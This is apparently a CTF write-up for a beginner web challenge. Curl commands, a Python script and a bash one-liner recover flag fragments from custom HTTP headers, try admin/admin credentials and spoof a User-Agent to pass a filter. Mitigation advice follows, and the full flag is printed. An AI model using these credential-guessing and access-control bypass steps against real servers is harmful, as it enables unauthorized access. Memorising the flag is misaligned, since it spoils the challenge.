---
title: "EotW CTF SS CASE IT 2025 - Signal Intercept Writeup"
date: "2025-05-27"
description: "Intercepting hidden signals in the AI Regime's communication system through HTTP header analysis. Learn how to use proxy tools to discover fragmented flags across multiple endpoints and custom headers."
tags: ["web-security", "http-headers", "burp-suite", "reconnaissance", "proxy-tools", "ctf", "signal-analysis"]
---

## Intercepting the AI Regime's Hidden Communications: HTTP Header Analysis

**Category**: Web Exploitation  
**Points**: 100  
**Description**: In the year 2025, the AI regime has implemented a sophisticated communication system for coordinating drone patrols and surveillance operations. As part of the resistance, 0x4m4 has discovered a vulnerability in their system. Your mission is to intercept the hidden signals in their communication system and piece together the access key that will allow the resistance to disrupt the regime's coordination network.

## Challenge Context

The AI regime has deployed an advanced communication system to coordinate their surveillance operations and drone patrols. The challenge presents us with access to their communication interface, but the real intelligence is hidden beneath the surface - transmitted through covert channels that require deeper inspection to uncover.

The application was accessible at `challs.0x4m4.com:8003` and appeared to be a command-and-control interface for the regime's operations.

## Initial Reconnaissance

When I first accessed the communication system, I was presented with a sleek interface featuring:

1. A command terminal interface for system operations
2. Various navigation elements and status indicators
3. References to system diagnostics and authentication
4. Hints about hidden transmission methods

```bash
curl -s http://challs.0x4m4.com:8003/ | grep -i "signal\|transmission\|header"
```

The challenge hint was particularly revealing: *"Not all data is visible in the browser. Sometimes you need to look deeper at what's actually being transmitted between client and server."*

## Setting Up Interception Tools

### Configuring Burp Suite

The first step was setting up proper traffic interception:

1. **Configure Burp Suite Proxy**: Set up the proxy listener on `127.0.0.1:8080`
2. **Browser Configuration**: Configure browser to use Burp as HTTP proxy
3. **Certificate Installation**: Install Burp's CA certificate for HTTPS interception
4. **Intercept Settings**: Enable response interception to analyze headers

```bash
# Alternative: Using curl with verbose output to see headers
curl -v http://challs.0x4m4.com:8003/
```

## Discovery Phase: Finding Hidden Endpoints

### Method 1: Source Code Analysis

Examining the page source revealed several clues:

```html
<!-- Hint: Valuable information is often hidden in transmission headers -->
<!-- Check /flag-part1 for debugging purposes -->
```

### Method 2: Robots.txt Enumeration

Checking the robots.txt file revealed crucial information:

```bash
curl -s http://challs.0x4m4.com:8003/robots.txt
```

The robots.txt contained:

```
User-agent: *
Disallow: /system/diagnostics
Disallow: /flag-part1

# Note to maintenance: 
# Remember to check response headers when using the scanner tool.
# All security fragments are transmitted via custom headers for additional security.
# New developers: Try /flag-part1 for debugging
```

This revealed:
- Hidden endpoint: `/system/diagnostics`
- Debug endpoint: `/flag-part1`
- **Key insight**: Flags are transmitted via custom headers
- **Important**: Scanner tools (like Burp) are required for `/system/diagnostics`

### Method 3: Interactive Elements

Clicking on the logo revealed a JavaScript alert: *"Hint: Valuable information is often hidden in transmission headers."*

## Signal Interception: Flag Fragment Discovery

### Fragment 1: Debug Endpoint

Accessing the debug endpoint with header inspection:

```bash
curl -v http://challs.0x4m4.com:8003/flag-part1
```

**Burp Suite Analysis:**
```
HTTP/1.1 200 OK
X-Flag-Part1: sscit{h1dd3n_
Content-Type: text/html
...
```

**Fragment 1 Discovered**: `sscit{h1dd3n_`

### Fragment 2: Authentication Endpoint

Testing the authentication system with admin credentials:

```bash
curl -v -X POST http://challs.0x4m4.com:8003/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

**Burp Suite Analysis:**
```
HTTP/1.1 200 OK
X-Communication-Channel: 1n_pl41n_
Content-Type: application/json
...
```

**Fragment 2 Discovered**: `1n_pl41n_`

### Fragment 3: Status Monitoring

Checking the system status endpoint:

```bash
curl -v http://challs.0x4m4.com:8003/status
```

**Burp Suite Analysis:**
```
HTTP/1.1 200 OK
X-System-Status: s1ght_4cr0ss_
Content-Type: application/json
...
```

**Fragment 3 Discovered**: `s1ght_4cr0ss_`

### Fragment 4: Hidden Diagnostics

The most challenging fragment required specific User-Agent manipulation:

```bash
curl -v http://challs.0x4m4.com:8003/system/diagnostics \
  -H "User-Agent: Burp Suite"
```

**Burp Suite Analysis:**
```
HTTP/1.1 200 OK
X-Diagnostic-Result: http_h34d3rs}
Content-Type: application/json
...
```

**Fragment 4 Discovered**: `http_h34d3rs}`

## Complete Exploitation Script

Here's my automated Python script for signal interception:

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin

class SignalInterceptExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.fragments = {}
        
    def discover_robots_txt(self):
        """Analyze robots.txt for hidden endpoints"""
        print("[*] Analyzing robots.txt for intelligence...")
        
        robots_url = urljoin(self.base_url, '/robots.txt')
        response = self.session.get(robots_url)
        
        if response.status_code == 200:
            print("[+] robots.txt found!")
            print(response.text)
            
            # Extract disallowed paths
            disallowed = re.findall(r'Disallow: (.+)', response.text)
            print(f"[+] Hidden endpoints discovered: {disallowed}")
            return disallowed
        
        return []
    
    def intercept_fragment_1(self):
        """Intercept first flag fragment from debug endpoint"""
        print("[*] Intercepting signal fragment 1...")
        
        endpoint = urljoin(self.base_url, '/flag-part1')
        response = self.session.get(endpoint)
        
        fragment = response.headers.get('X-Flag-Part1')
        if fragment:
            print(f"[+] Fragment 1 intercepted: {fragment}")
            self.fragments['part1'] = fragment
            return fragment
        
        print("[-] Fragment 1 not found")
        return None
    
    def intercept_fragment_2(self):
        """Intercept second flag fragment from auth endpoint"""
        print("[*] Intercepting signal fragment 2...")
        
        endpoint = urljoin(self.base_url, '/auth')
        data = {
            'username': 'admin',
            'password': 'admin'
        }
        
        response = self.session.post(endpoint, json=data)
        
        fragment = response.headers.get('X-Communication-Channel')
        if fragment:
            print(f"[+] Fragment 2 intercepted: {fragment}")
            self.fragments['part2'] = fragment
            return fragment
        
        print("[-] Fragment 2 not found")
        return None
    
    def intercept_fragment_3(self):
        """Intercept third flag fragment from status endpoint"""
        print("[*] Intercepting signal fragment 3...")
        
        endpoint = urljoin(self.base_url, '/status')
        response = self.session.get(endpoint)
        
        fragment = response.headers.get('X-System-Status')
        if fragment:
            print(f"[+] Fragment 3 intercepted: {fragment}")
            self.fragments['part3'] = fragment
            return fragment
        
        print("[-] Fragment 3 not found")
        return None
    
    def intercept_fragment_4(self):
        """Intercept fourth flag fragment from diagnostics endpoint"""
        print("[*] Intercepting signal fragment 4...")
        
        endpoint = urljoin(self.base_url, '/system/diagnostics')
        
        # Critical: Use scanner-like User-Agent
        headers = {
            'User-Agent': 'Burp Suite Professional'
        }
        
        response = self.session.get(endpoint, headers=headers)
        
        fragment = response.headers.get('X-Diagnostic-Result')
        if fragment:
            print(f"[+] Fragment 4 intercepted: {fragment}")
            self.fragments['part4'] = fragment
            return fragment
        
        print("[-] Fragment 4 not found")
        return None
    
    def reconstruct_signal(self):
        """Reconstruct the complete signal from fragments"""
        print("[*] Reconstructing complete signal...")
        
        if len(self.fragments) == 4:
            complete_flag = (
                self.fragments.get('part1', '') +
                self.fragments.get('part2', '') +
                self.fragments.get('part3', '') +
                self.fragments.get('part4', '')
            )
            
            print(f"[+] Complete signal reconstructed: {complete_flag}")
            return complete_flag
        else:
            print(f"[-] Incomplete signal: {len(self.fragments)}/4 fragments")
            return None
    
    def exploit(self):
        """Main signal interception flow"""
        print(f"[*] Starting signal interception on {self.base_url}")
        
        # Reconnaissance phase
        hidden_endpoints = self.discover_robots_txt()
        
        # Signal interception phase
        self.intercept_fragment_1()
        self.intercept_fragment_2()
        self.intercept_fragment_3()
        self.intercept_fragment_4()
        
        # Signal reconstruction
        complete_signal = self.reconstruct_signal()
        
        if complete_signal:
            print(f"[+] Mission accomplished! Access key obtained: {complete_signal}")
            return complete_signal
        else:
            print("[-] Mission failed: Unable to reconstruct complete signal")
            return None

if __name__ == "__main__":
    target = "http://challs.0x4m4.com:8003"
    exploit = SignalInterceptExploit(target)
    exploit.exploit()
```

## Running the Signal Interception

When I executed the complete interception:

```bash
python3 exploit.py
[*] Starting signal interception on http://challs.0x4m4.com:8003
[*] Analyzing robots.txt for intelligence...
[+] robots.txt found!
[+] Hidden endpoints discovered: ['/system/diagnostics', '/flag-part1']
[*] Intercepting signal fragment 1...
[+] Fragment 1 intercepted: sscit{h1dd3n_
[*] Intercepting signal fragment 2...
[+] Fragment 2 intercepted: 1n_pl41n_
[*] Intercepting signal fragment 3...
[+] Fragment 3 intercepted: s1ght_4cr0ss_
[*] Intercepting signal fragment 4...
[+] Fragment 4 intercepted: http_h34d3rs}
[*] Reconstructing complete signal...
[+] Complete signal reconstructed: sscit{h1dd3n_1n_pl41n_s1ght_4cr0ss_http_h34d3rs}
[+] Mission accomplished! Access key obtained: sscit{h1dd3n_1n_pl41n_s1ght_4cr0ss_http_h34d3rs}
```

## Alternative Methods: Command Line Interception

### One-liner Bash Script

```bash
#!/bin/bash
echo "Intercepting AI Regime signals..."

part1=$(curl -s http://challs.0x4m4.com:8003/flag-part1 -v 2>&1 | grep -i X-Flag-Part1 | awk '{print $3}')
part2=$(curl -s -X POST http://challs.0x4m4.com:8003/auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' -v 2>&1 | grep -i X-Communication-Channel | awk '{print $3}')
part3=$(curl -s http://challs.0x4m4.com:8003/status -v 2>&1 | grep -i X-System-Status | awk '{print $3}')
part4=$(curl -s http://challs.0x4m4.com:8003/system/diagnostics -H 'User-Agent: Burp Suite' -v 2>&1 | grep -i X-Diagnostic-Result | awk '{print $3}')

echo "Signal fragments intercepted:"
echo "Fragment 1: $part1"
echo "Fragment 2: $part2"
echo "Fragment 3: $part3"
echo "Fragment 4: $part4"
echo ""
echo "Complete access key: $part1$part2$part3$part4"
```

### Manual Burp Suite Workflow

1. **Configure Proxy**: Set up Burp Suite proxy interception
2. **Navigate to Target**: Access `http://challs.0x4m4.com:8003`
3. **Check robots.txt**: Discover hidden endpoints
4. **Intercept Requests**: Visit each endpoint while monitoring headers
5. **Extract Fragments**: Record custom header values
6. **Reconstruct Signal**: Combine all fragments in order

## Technical Deep Dive

### HTTP Header Analysis

The challenge demonstrates several important concepts:

#### Custom Headers for Covert Communication

```http
X-Flag-Part1: sscit{h1dd3n_
X-Communication-Channel: 1n_pl41n_
X-System-Status: s1ght_4cr0ss_
X-Diagnostic-Result: http_h34d3rs}
```

#### User-Agent Based Access Control

The `/system/diagnostics` endpoint implements User-Agent filtering:

```python
# Simplified server-side logic
if 'scanner' in user_agent.lower() or 'burp' in user_agent.lower():
    response.headers['X-Diagnostic-Result'] = fragment
else:
    return 403  # Forbidden
```

## Key Learnings

This challenge taught me several important concepts:

1. **HTTP Headers as Covert Channels**: Data can be transmitted through custom headers
2. **Proxy Tool Proficiency**: Essential for web security testing
3. **Reconnaissance Methodology**: Systematic approach to endpoint discovery
4. **User-Agent Manipulation**: Bypassing simple access controls
5. **Fragment Reconstruction**: Piecing together distributed information

## Prevention and Detection

### Server-Side Mitigations

1. **Avoid Custom Headers for Sensitive Data**:
```python
# Don't do this
response.headers['X-Secret-Data'] = sensitive_info

# Instead, use proper authentication and authorization
```

2. **Implement Proper Access Controls**:
```python
# Better access control
@require_authentication
@require_authorization('admin')
def diagnostics_endpoint():
    return diagnostic_data
```

## Conclusion

The Signal Intercept challenge was an excellent introduction to HTTP header analysis and proxy tool usage. By systematically intercepting communications across multiple endpoints, I was able to reconstruct the complete access key that would allow the resistance to disrupt the AI regime's coordination network.

This challenge highlighted the importance of:
- Understanding HTTP protocol internals
- Using proxy tools for security testing
- Systematic reconnaissance methodology
- Recognizing covert communication channels

The successful interception demonstrates how seemingly innocuous HTTP headers can be used to transmit sensitive information, and how proper tools and techniques can uncover these hidden signals.

The complete access key was: `sscit{h1dd3n_1n_pl41n_s1ght_4cr0ss_http_h34d3rs}`

The resistance has successfully intercepted the AI regime's communications! 📡🔓 